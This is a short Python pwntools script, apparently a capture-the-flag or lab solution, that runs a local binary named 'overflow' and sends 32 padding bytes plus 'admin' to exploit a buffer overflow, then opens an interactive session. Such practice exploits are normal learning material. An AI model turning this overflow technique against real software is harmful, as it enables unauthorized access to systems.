from pwn import *

p = process("../overflow")

p.sendline(b"A"*32 + b"admin")
p.interactive()
